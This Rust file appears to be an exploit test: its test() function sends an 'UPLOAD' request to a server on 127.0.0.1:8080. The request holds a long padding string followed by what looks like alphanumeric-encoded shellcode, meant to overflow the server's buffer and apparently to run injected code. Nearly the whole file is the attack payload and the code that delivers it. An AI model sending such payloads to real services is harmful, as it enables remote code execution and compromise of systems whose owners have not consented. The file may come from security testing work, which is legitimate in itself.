use std::io::{Read, Write}; // Necessary imports for TcpStream operations
use std::net::{TcpStream, SocketAddr};

pub fn test() {

    let server_addr = "127.0.0.1:8080".parse::<SocketAddr>().unwrap();
    let mut stream = TcpStream::connect(server_addr).expect("Failed to connect to server");

    let overflow_payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÛ]YnåÚÞÙuôXPYIIIICCCCCCQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLM8LB305PEP50MYKUP19PSTLK60FPLK1BTLLKPR5DLKCBWXDOX7PJQ6VQKONLGLU1SLURFLWPIQXOTM5QHGM2KBPRF7LKQBDPLKQZWLLKPL21D8M30HS1HQ0QLK69GP5Q8SLK79UHKSFZ79LKFTLKEQ9FFQKONLO1HO4M319WGHM0SEZVTCSMJX7KSMGT3EJDF8LK1HQ4319C2FLK4LPKLKQHELUQXSLK5TLKC1HPLI0D7TVD1KQK51PYQJ61KOKPQO1O0ZLKEBZKLM1MCZ5QLMMUX230UPEP0PU8FQLKBOLGKOXUOKL0NUI2PV2HY6J5OMMMKOXU7LC6SL5ZMPKKKPT5UUOKPG5C2R2OSZ30F3KO9EBNRO44SUBP3QRDVN2E2X2E5PAA";  // Increase the size to exceed buffer

    let _request = format!("UPLOAD /tmp/overflow.txt {}\n", overflow_payload);

    stream.write_all(_request.as_bytes()).expect("Failed to send request");

    let mut response = String::new();
    let mut buffer = [0; 1024]; 
    while let Ok(n) = stream.read(&mut buffer) {
        if n == 0 {
            break;  
        }
        response.push_str(std::str::from_utf8(&buffer[..n]).unwrap());
    }


    println!("Response: {}", response);
}
